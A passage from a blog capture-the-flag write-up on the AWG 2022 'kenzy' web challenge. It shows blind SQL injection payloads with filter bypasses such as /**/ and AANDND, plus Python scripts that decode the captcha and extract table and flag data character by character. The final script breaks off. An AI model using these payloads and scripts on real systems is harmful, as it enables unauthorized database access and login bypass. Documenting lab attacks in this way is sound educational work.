<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>kenzy challenge Writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/web-exploitation/2022-08-06-kenzy/">
  <meta property="og:site_name" content="My New Hugo Site">
  <meta property="og:title" content="kenzy challenge Writeup">
  <meta property="og:description" content="CTF name AWG 2022 challenge kenzy category web about SQL injection description captcha is not that secure points 900 team 0xCha0s Discovery we are introduced with this page which takes username ,password and the Captcha
If we check the source code we can notice this comment
&lt;!-- Username =====&gt; admin --&gt;we can also find the endpoint which generates the captcha each time we request it different captcha is assigned">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-08-06T12:49:18+02:00">
    <meta property="article:modified_time" content="2022-08-06T12:49:18+02:00">
    <meta property="article:tag" content="CTF">
    <meta property="article:tag" content="Sql-Injection">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="kenzy challenge Writeup">
  <meta name="twitter:description" content="CTF name AWG 2022 challenge kenzy category web about SQL injection description captcha is not that secure points 900 team 0xCha0s Discovery we are introduced with this page which takes username ,password and the Captcha
If we check the source code we can notice this comment
&lt;!-- Username =====&gt; admin --&gt;we can also find the endpoint which generates the captcha each time we request it different captcha is assigned">
      <meta name="twitter:site" content="@tinkerhell1337">
<meta name="application-name" content="0xMesbaha">
<meta name="apple-mobile-web-app-title" content="0xMesbaha">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/web-exploitation/2022-08-06-kenzy/" /><link rel="prev" href="http://example.org/posts/web-exploitation/2022-07-25-flused-emoji/" /><link rel="next" href="http://example.org/posts/windows-machines/2022-08-20-timelapse/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "kenzy challenge Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/example.org\/posts\/web-exploitation\/2022-08-06-kenzy\/"
        },"genre": "posts","keywords": "CTF, sql-injection","wordcount":  933 ,
        "url": "http:\/\/example.org\/posts\/web-exploitation\/2022-08-06-kenzy\/","datePublished": "2022-08-06T12:49:18+02:00","dateModified": "2022-08-06T12:49:18+02:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "0xMesbaha"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'dark';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="My New Hugo Site">0xMesbaha</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="My New Hugo Site">0xMesbaha</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">kenzy challenge Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/web-exploitation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web Exploitation</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-06">2022-08-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;933 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#discovery">Discovery</a></li>
    <li><a href="#exploitation">Exploitation</a></li>
    <li><a href="#getting-the-flag">Getting the Flag</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><table>
  <thead>
      <tr>
          <th></th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>CTF name</td>
          <td><a href="https://www.ascyberwargames.com/" target="_blank" rel="noopener noreffer ">AWG 2022</a></td>
      </tr>
      <tr>
          <td>challenge</td>
          <td>kenzy</td>
      </tr>
      <tr>
          <td>category</td>
          <td>web</td>
      </tr>
      <tr>
          <td>about</td>
          <td>SQL injection</td>
      </tr>
      <tr>
          <td>description</td>
          <td>captcha is not that secure</td>
      </tr>
      <tr>
          <td>points</td>
          <td>900</td>
      </tr>
      <tr>
          <td>team</td>
          <td><a href="https://ctftime.org/team/168238" target="_blank" rel="noopener noreffer ">0xCha0s</a></td>
      </tr>
  </tbody>
</table>
<h2 id="discovery">Discovery</h2>
<p>we are introduced with this page which takes username ,password and the Captcha</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/kenzy/20220806020216.png"
        data-srcset="/assets/images/kenzy/20220806020216.png, /assets/images/kenzy/20220806020216.png 1.5x, /assets/images/kenzy/20220806020216.png 2x"
        data-sizes="auto"
        alt="/assets/images/kenzy/20220806020216.png"
        title="error" /></p>
<p>If we check the source code we can notice this comment</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-cmd">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">        <span class="p">&lt;</span>!-- Username =====<span class="p">&gt;</span> admin --&gt;</span></span></code></pre></div></div>
<p>we can also find the endpoint which generates the captcha each time we request it different captcha is assigned</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-cmd">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">http://34.175.249.72:60001/scripts/captcha.php</span></span></code></pre></div></div>
<p>Let&rsquo;s check the application by submitting the admin as a username and any password with a valid captcha</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/kenzy/20220806021154.png"
        data-srcset="/assets/images/kenzy/20220806021154.png, /assets/images/kenzy/20220806021154.png 1.5x, /assets/images/kenzy/20220806021154.png 2x"
        data-sizes="auto"
        alt="/assets/images/kenzy/20220806021154.png"
        title="error" /></p>
<p>It returns an <code>invalid username or password</code> because we don&rsquo;t really know the correct password and default credentials don&rsquo;t work</p>
<p>as we want to be able to login without password , we should think of SQL injection.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/kenzy/20220806021637.png"
        data-srcset="/assets/images/kenzy/20220806021637.png, /assets/images/kenzy/20220806021637.png 1.5x, /assets/images/kenzy/20220806021637.png 2x"
        data-sizes="auto"
        alt="/assets/images/kenzy/20220806021637.png"
        title="error" /></p>
<p>trying a basic payload at the password we can see this result which is a great hint for SQLi , we should be in the correct path but this page doesn&rsquo;t reveal much.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/kenzy/20220806021712.png"
        data-srcset="/assets/images/kenzy/20220806021712.png, /assets/images/kenzy/20220806021712.png 1.5x, /assets/images/kenzy/20220806021712.png 2x"
        data-sizes="auto"
        alt="/assets/images/kenzy/20220806021712.png"
        title="error" /></p>
<p>Trying some payloads in the password filed wasn&rsquo;t really helpful as when we tried <code>admin' OR 1=1#</code> it returns same response for <code>1=1</code> and <code>1=2</code> . so it doesn&rsquo;t work really well. we can take a look at the username field.</p>
<p>Trying <code>username=admin' OR 1=1#</code> we got this response</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-cmd">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"> {<span class="s2">&#34;Username&#34;</span>:<span class="s2">&#34;admin&#39;1=1#&#34;</span>,<span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;statement error&#34;</span>}</span></span></code></pre></div></div>
<p>we can see the <strong>OR</strong> is removed and the spaces as well ! , same thing with the <strong>AND</strong></p>
<p>-&gt; Bypass filters :</p>
<p>The most famous bypass for the spaces filter is replacing it with <code>/**/</code> , and we can try use <code>OORR</code> instead of <code>OR</code> so if <code>OR</code> is removed from <code>OORR</code> we got our <code>OR</code> if filters are not so restricted . same for <code>AND</code> we can use <code>AANDND</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-cmd">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">username=admin&#39;/**/AANDND/**/1=1#</span></span></code></pre></div></div>
<p>and we got the wished results</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/kenzy/20220806022447.png"
        data-srcset="/assets/images/kenzy/20220806022447.png, /assets/images/kenzy/20220806022447.png 1.5x, /assets/images/kenzy/20220806022447.png 2x"
        data-sizes="auto"
        alt="/assets/images/kenzy/20220806022447.png"
        title="error" /></p>
<p>To make sure we have a valid Blind SQL injection we should be able to control input to trigger 2 different responses one for the True case and The False one.</p>
<p>Trying same payload with <code>1=2</code> to be</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-cmd">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">username=admin&#39;/**/AANDND/**/1=2#</span></span></code></pre></div></div>
<p>we will get this response , so we can control this input !</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-json">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#39;/**/AND/**/1=2#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid username or password&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>it will be a tedious process to write the captcha each time with each request , specially blind sqli will issue a lot of requests so we need to build some sort of python script to automate this process</p>
<h2 id="exploitation">Exploitation</h2>
<p>First we need to parse the captcha somehow , we can try issue a request to <code>/scripts/captcha.php</code> to see if the response contains the captcha as text.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/kenzy/20220806023237.png"
        data-srcset="/assets/images/kenzy/20220806023237.png, /assets/images/kenzy/20220806023237.png 1.5x, /assets/images/kenzy/20220806023237.png 2x"
        data-sizes="auto"
        alt="/assets/images/kenzy/20220806023237.png"
        title="error" /></p>
<p>and indeed it sends the captcha base64 encoded , so we can parse it easily and get the value .</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://34.175.249.72:60001/scripts/captcha.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">captcha</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">captcha_decode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">captcha</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">captcha_decode</span><span class="p">)</span></span></span></code></pre></div></div>
<p>This code will parse the captcha and get us the decoded value which we need during the login process. now we need to send another request to the login page to see the response</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">url2</span> <span class="o">=</span> <span class="s1">&#39;http://34.175.249.72:60001/index.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; AND 1=1#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;/**/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;AND&#39;</span><span class="p">,</span><span class="s1">&#39;ANANDD&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span> <span class="p">:</span><span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span>  <span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="s1">&#39;captcha&#39;</span> <span class="p">:</span> <span class="n">captcha_decode</span> <span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="s1">&#39;send&#39;</span> <span class="p">:</span><span class="s1">&#39;Send&#39;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span> <span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span></span></code></pre></div></div>
<p>assembling the 2 code snippets above we will see the exploit works as expected indeed , now we can start constructing our query to retrieve table name and the flag content.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">table</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">flag</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">126</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://34.175.249.72:60001/scripts/captcha.php&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">captcha</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">captcha_decode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">captcha</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">url2</span> <span class="o">=</span> <span class="s1">&#39;http://34.175.249.72:60001/index.php&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; AND </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">=ascii(substr((SELECT table_name FROM information_schema.tables where table_schema=database() limit 1),</span><span class="si">{</span><span class="n">counter</span><span class="si">}</span><span class="s2">,1))#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;/**/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;AND&#39;</span><span class="p">,</span><span class="s1">&#39;ANANDD&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span> <span class="p">:</span><span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span>  <span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;captcha&#39;</span> <span class="p">:</span> <span class="n">captcha_decode</span> <span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;send&#39;</span> <span class="p">:</span><span class="s1">&#39;Send&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span> <span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">table</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Treasures&#34;</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">table</span> <span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">counter</span> <span class="o">+=</span><span class="mi">1</span></span></span></code></pre></div></div>
<p>we have just made 2 loops , the Flag variable is important as it will be the factor to stop the code . basically it will allow the while loop to keep iterating if we found a letter in the insider loop but if it did iterate through all characters and doesn&rsquo;t found a valid one it will not loop again , it will exit.</p>
<p>the query has 2 variables the counter and the ascii representation of the desirable letter .</p>
<p>Running the code above we got the table name is <code>solve</code> .</p>
<h2 id="getting-the-flag">Getting the Flag</h2>
<p>will use same approach to get the flag content , we can guess the column is named flag and we can verify that by using this payload</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;admin&#39; AND &#39;f&#39;=substr((select column_name from information_schema.columns WHERE table_name=&#39;solve&#39; limit 1),1,1)#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;/**/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;AND&#39;</span><span class="p">,</span><span class="s1">&#39;ANANDD&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
<p>and will find <code>f</code> is valid as the first character in the <code>column_name</code> , we can continue until we find column name is <code>flag</code> indeed</p>
<p>now we can start ask for each character in our flag until we get the last character which should be <code>}</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span> <span class="s2">&#34;ASCWG{&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="mi">7</span> <span class="c1"># start after ASCWG{</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="ow">not</span> <span class="n">flag</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;}&#34;</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">31</span><span class="p">,</span><span class="mi">126</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://34.175.249.72:60001/scripts/captcha.php&#34;</span>
</span></span><span class="line"><span class="cl">		<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
